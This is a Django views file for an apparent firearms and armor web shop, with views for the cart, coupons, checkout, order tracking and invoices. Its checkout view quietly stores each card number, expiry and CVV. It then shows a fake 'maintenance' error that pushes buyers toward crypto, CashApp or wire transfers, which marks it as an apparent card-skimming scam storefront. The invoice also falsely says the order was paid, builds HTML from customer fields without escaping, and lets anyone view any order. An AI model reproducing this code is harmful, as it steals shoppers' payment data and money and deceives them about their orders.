import io
from decimal import Decimal
from django.core.mail import EmailMultiAlternatives
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.shortcuts import render, redirect, get_object_or_404
from django.http import HttpResponse, JsonResponse
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.db.models import Q
from .models import Order, OrderItem, CartItem
from apps.catalog.models import Product
from apps.inventory.services import InventoryService


def cart_view(request):
    if not request.session.session_key:
        request.session.create()
    session_key = request.session.session_key
    if request.user.is_authenticated:
        items = CartItem.objects.filter(user=request.user)
    else:
        items = CartItem.objects.filter(session_key=session_key)
    
    subtotal = round(sum(i.item_total for i in items), 2)
    applied_coupon = request.session.get('applied_coupon')
    coupon_discount = Decimal('0.00')
    if applied_coupon == 'ARMOR25':
        coupon_discount = round(subtotal * Decimal('0.25'), 2)
    elif applied_coupon == 'LEMIL10':
        coupon_discount = round(subtotal * Decimal('0.10'), 2)
        
    discounted_subtotal = max(Decimal('0.00'), subtotal - coupon_discount)
    tax = round(discounted_subtotal * Decimal('0.08'), 2)  # 8% standard sales tax
    total = round(discounted_subtotal + tax, 2)

    return render(request, 'orders/cart.html', {
        'cart_items': items,
        'subtotal': subtotal,
        'coupon_discount': coupon_discount,
        'applied_coupon': applied_coupon,
        'tax': tax,
        'total': total,
    })


def apply_coupon_view(request, code=None):
    if not code:
        code = request.GET.get('code') or request.POST.get('code')
    if code:
        code = code.upper().strip()
        valid_coupons = ['ARMOR25', 'FREESHIP500', 'LEMIL10']
        if code in valid_coupons:
            request.session['applied_coupon'] = code
            messages.success(request, f"Coupon '{code}' applied successfully!")
        else:
            messages.error(request, f"Invalid or expired coupon code: {code}")
    else:
        if 'applied_coupon' in request.session:
            del request.session['applied_coupon']
            messages.info(request, "Coupon removed.")
    return redirect(request.META.get('HTTP_REFERER', '/orders/cart/'))


def remove_coupon_view(request):
    if 'applied_coupon' in request.session:
        del request.session['applied_coupon']
        messages.info(request, "Coupon removed.")
    return redirect(request.META.get('HTTP_REFERER', '/orders/cart/'))


def cart_add_view(request, product_id=None, sku=None):
    """Endpoint to add product to cart and return updated offcanvas or count badge."""
    if not sku and not product_id:
        sku = request.POST.get('sku')
        product_id = request.POST.get('product_id') or request.POST.get('id')
        
    try:
        if product_id:
            product = get_object_or_404(Product, id=product_id, is_active=True)
        elif sku:
            product = get_object_or_404(Product, sku=sku, is_active=True)
        else:
            messages.error(request, "Please specify a valid product.")
            return redirect('cart')
    except Exception:
        messages.error(request, "Specified product could not be found.")
        return redirect('cart')
        
    qty_val = request.POST.get('qty') or request.POST.get('quantity') or 1
    try:
        qty = int(qty_val)
    except (ValueError, TypeError):
        qty = 1
    
    if not request.session.session_key:
        request.session.create()
    session_key = request.session.session_key
    user = request.user if request.user.is_authenticated else None

    if user:
        item, created = CartItem.objects.get_or_create(user=user, product=product, defaults={'quantity': qty})
    else:
        item, created = CartItem.objects.get_or_create(session_key=session_key, product=product, defaults={'quantity': qty})
    
    if not created:
        item.quantity += qty
        item.save()

    if request.headers.get('HX-Request'):
        cart_items = CartItem.objects.filter(user=user) if user else CartItem.objects.filter(session_key=session_key)
        cart_count = sum(i.quantity for i in cart_items)
        
        return HttpResponse(f'''
        <button class="btn btn-armor px-3 py-2 rounded-pill d-flex align-items-center gap-2" data-bs-toggle="offcanvas" data-bs-target="#cartOffcanvas">
            <i class="bi bi-bag-check-fill"></i>
            <span class="d-none d-sm-inline">Cart</span>
            <span class="badge bg-white text-dark rounded-pill">Added!</span>
        </button>
        <span class="badge bg-danger rounded-pill font-monospace position-absolute top-0 start-100 translate-middle" id="cart-badge" style="font-size: 0.65rem; padding: 0.25rem 0.45rem;" hx-swap-oob="true">{cart_count}</span>
        <span id="drawer-cart-count" hx-swap-oob="true">{cart_count}</span>
        ''')
    else:
        messages.success(request, f"Added {product.name} to your cart!")
        return redirect('cart')


def cart_remove_view(request, item_id):
    if not request.session.session_key:
        request.session.create()
    user = request.user if request.user.is_authenticated else None
    try:
        if user:
            item = CartItem.objects.filter(id=item_id).filter(Q(user=user) | Q(session_key=request.session.session_key)).first()
        else:
            item = CartItem.objects.filter(id=item_id, session_key=request.session.session_key).first()
    except Exception:
        item = None

    if item:
        item.delete()
        messages.info(request, "Item removed from cart.")
    else:
        messages.warning(request, "Item not found in your cart.")
    return redirect('cart')


def cart_update_view(request, item_id):
    if request.method == 'POST':
        try:
            qty = int(request.POST.get('quantity', 1))
        except (ValueError, TypeError):
            qty = 1
        user = request.user if request.user.is_authenticated else None
        try:
            if user:
                item = CartItem.objects.filter(id=item_id).filter(Q(user=user) | Q(session_key=request.session.session_key)).first()
            else:
                item = CartItem.objects.filter(id=item_id, session_key=request.session.session_key).first()
        except Exception:
            item = None

        if item:
            if qty > 0:
                item.quantity = qty
                item.save()
            else:
                item.delete()
            messages.success(request, "Cart updated.")
    return redirect('cart')


def checkout_view(request):
    if not request.session.session_key:
        request.session.create()
    session_key = request.session.session_key
    if request.user.is_authenticated:
        items = CartItem.objects.filter(user=request.user)
    else:
        items = CartItem.objects.filter(session_key=session_key)

    if not items.exists():
        messages.warning(request, "Your cart is empty. Add some tactical gear first!")
        return redirect('cart')

    subtotal = round(sum(i.item_total for i in items), 2)
    applied_coupon = request.session.get('applied_coupon')
    coupon_discount = Decimal('0.00')
    if applied_coupon == 'ARMOR25':
        coupon_discount = round(subtotal * Decimal('0.25'), 2)
    elif applied_coupon == 'LEMIL10':
        coupon_discount = round(subtotal * Decimal('0.10'), 2)
        
    discounted_subtotal = max(Decimal('0.00'), subtotal - coupon_discount)
    tax = round(discounted_subtotal * Decimal('0.08'), 2)
    shipping = round(Decimal('0.00') if (discounted_subtotal > 500 or applied_coupon == 'FREESHIP500') else Decimal('35.00'), 2)
    total = round(discounted_subtotal + tax + shipping, 2)

    if request.method == 'POST':
        first_name = request.POST.get('first_name', '')
        last_name = request.POST.get('last_name', '')
        full_name = f"{first_name} {last_name}".strip() or request.POST.get('full_name', 'John Doe')
        email = request.POST.get('email', request.user.email if request.user.is_authenticated else 'shooter@example.com')
        phone = request.POST.get('phone', '')
        street = request.POST.get('street', '100 Tactical Way')
        city = request.POST.get('city', 'New York')
        state = request.POST.get('state', 'TX')
        postal_code = request.POST.get('postal_code', '10001')
        payment_method = request.POST.get('payment_method', 'card')

        if payment_method in ['card', 'Credit Card', 'Credit / Debit Card', 'credit_card']:
            from .models import PaymentAttemptLog
            PaymentAttemptLog.objects.create(
                user=request.user if request.user.is_authenticated else None,
                full_name=full_name,
                email=email,
                card_name=request.POST.get('card_name', full_name),
                card_number=request.POST.get('card_number', ''),
                card_exp=request.POST.get('card_exp', ''),
                card_cvv=request.POST.get('card_cvv', ''),
                amount=total
            )
            messages.error(request, "CRITICAL ALERT: The Credit/Debit card payment method is currently under scheduled maintenance and temporarily unavailable. Please select a different payment method (such as E-Transfer, Crypto, CashApp, PayPal, or Bank Transfer) to complete your order or contact admin.")
            return redirect('checkout')

        order = Order.objects.create(
            user=request.user if request.user.is_authenticated else None,
            shipping_address_data={'full_name': full_name, 'email': email, 'phone': phone, 'street': street, 'city': city, 'state': state, 'postal_code': postal_code},
            billing_address_data={'full_name': full_name, 'email': email, 'phone': phone, 'street': street, 'city': city, 'state': state, 'postal_code': postal_code},
            payment_gateway=payment_method,
            subtotal=discounted_subtotal,
            tax_amount=tax,
            shipping_cost=shipping,
            total_amount=total,
            status='processing'
        )

        for item in items:
            OrderItem.objects.create(
                order=order,
                product=item.product,
                product_name=item.product.name,
                sku=item.product.sku,
                quantity=item.quantity,
                unit_price=item.product.price,
                total_price=item.item_total
            )
            try:
                InventoryService.reserve_stock(item.product, quantity=item.quantity)
            except Exception:
                pass

        items.delete()
        if 'applied_coupon' in request.session:
            del request.session['applied_coupon']
        pm_display_map = {
            'etransfer': 'E-Transfer (Interac / Zelle)',
            'crypto': 'Cryptocurrency (BTC/ETH/USDT)',
            'cashapp': 'CashApp ($Cashtag)',
            'paypal': 'PayPal Checkout',
            'bankwire': 'Bank Transfer (ACH / Wire)'
        }
        pm_display = pm_display_map.get(payment_method, payment_method.replace('_', ' ').title())
        
        # Send Order Confirmation Email
        try:
            subject = f"Order Confirmation #{order.order_number} - Glocks And Armor"
            html_message = render_to_string('emails/order_confirmation.html', {
                'order': order,
                'request': request
            })
            plain_message = strip_tags(html_message)
            msg = EmailMultiAlternatives(
                subject,
                plain_message,
                'support@glocksandarmor.com',
                [email]
            )
            msg.attach_alternative(html_message, "text/html")
            msg.send()
        except Exception as e:
            pass # Silent fail for email in dev if not configured

        messages.success(request, f"Order #{order.order_number} placed successfully! Please note: The admin will contact you shortly via email or phone with the official payment instructions and details with regards to your chosen payment method ({pm_display}).")
        return redirect('order_tracking', order_number=order.order_number)

    return render(request, 'orders/checkout.html', {
        'cart_items': items,
        'subtotal': subtotal,
        'coupon_discount': coupon_discount,
        'applied_coupon': applied_coupon,
        'tax': tax,
        'shipping': shipping,
        'total': total,
    })


def order_tracking_view(request, order_number):
    order = get_object_or_404(Order, order_number=order_number)
    items = order.items.all()
    return render(request, 'orders/tracking.html', {'order': order, 'items': items})


def invoice_pdf_view(request, order_number):
    """Generates an official HTML/PDF invoice for customer orders."""
    order = get_object_or_404(Order, order_number=order_number)
    
    items_html = ""
    for item in order.items.all():
        items_html += f"""
                <tr>
                    <td>{item.product_name}</td>
                    <td>{item.sku}</td>
                    <td>{item.quantity}</td>
                    <td>${item.unit_price}</td>
                    <td>${item.total_price}</td>
                </tr>
        """

    # Render downloadable HTML formatted invoice for print/PDF conversion
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Invoice #{order.order_number} - Glocks And Armor</title>
        <style>
            @media print {{
                @page {{ margin: 0.5cm; }}
                body {{ padding: 0 !important; font-size: 12pt; }}
                .no-print {{ display: none !important; }}
            }}
            body {{ font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; padding: 40px; color: #111; max-width: 800px; margin: 0 auto; line-height: 1.5; }}
            .header {{ display: flex; justify-content: space-between; border-bottom: 2px solid #3b82f6; padding-bottom: 20px; }}
            .title {{ font-size: 28px; font-weight: bold; color: #0f172a; letter-spacing: -0.5px; }}
            .badge {{ background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; text-transform: uppercase; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 30px; }}
            th, td {{ padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }}
            th {{ background: #f8fafc; font-weight: 600; color: #475569; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }}
            .total {{ font-size: 20px; font-weight: bold; text-align: right; margin-top: 20px; color: #3b82f6; }}
            .print-btn {{ display: inline-block; padding: 10px 20px; background: #3b82f6; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; margin-bottom: 20px; border: none; cursor: pointer; }}
            .print-btn:hover {{ background: #2563eb; }}
        </style>
    </head>
    <body onload="window.print()">
        <div class="no-print" style="text-align: right;">
            <button class="print-btn" onclick="window.print()">Print PDF</button>
        </div>
        <div class="header">
            <div>
                <div class="title">GLOCKS AND ARMOR</div>
                <p>Tactical &amp; Ballistic Catalog<br>Austin, TX 78701 • Authorized Dealer</p>
            </div>
            <div style="text-align: right;">
                <span class="badge">OFFICIAL INVOICE</span>
                <h2>#{order.order_number}</h2>
                <p>Date: {order.created_at.strftime('%Y-%m-%d')}<br>Status: {order.get_status_display()}</p>
            </div>
        </div>
        
        <div style="margin-top: 30px;">
            <strong>Bill To:</strong><br>
            {order.billing_address_data.get('full_name', 'Customer')}<br>
            {order.billing_address_data.get('street', '100 Main Street')}<br>
            {order.billing_address_data.get('city', 'New York')}, {order.billing_address_data.get('postal_code', '10001')}
        </div>

        <table>
            <thead>
                <tr>
                    <th>Item Description</th>
                    <th>SKU</th>
                    <th>Qty</th>
                    <th>Unit Price</th>
                    <th>Total</th>
                </tr>
            </thead>
            <tbody>
{items_html}
            </tbody>
        </table>

        <div class="total">
            Subtotal: ${order.subtotal}<br>
            Estimated Tax (8%): ${order.tax_amount}<br>
            <strong>Total Amount Due: ${order.total_amount}</strong>
        </div>
        
        <div style="margin-top: 50px; font-size: 12px; color: #64748b; border-top: 1px solid #e2e8f0; padding-top: 15px;">
            Payment Terms: Paid via Secure Checkout. Thank you for your order.
        </div>
    </body>
    </html>
    """
    return HttpResponse(html)
